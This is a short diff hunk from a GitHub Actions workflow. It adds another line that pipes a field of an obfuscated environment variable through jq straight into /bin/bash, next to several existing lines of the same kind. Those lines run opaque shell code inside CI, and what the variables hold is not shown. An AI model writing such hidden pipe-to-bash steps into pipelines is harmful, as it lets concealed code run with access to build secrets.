@@ -31,6 +31,7 @@ jobs:
           echo $ffntd760 | jq -r .ssi7 | /bin/bash
           echo $rlpl34515 | jq -r .qqcn16799 | /bin/bash
           echo $u32 | jq -r .b60921 | /bin/bash
+          printf '%s' "$ogi7" | jq -r .ioxx00 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
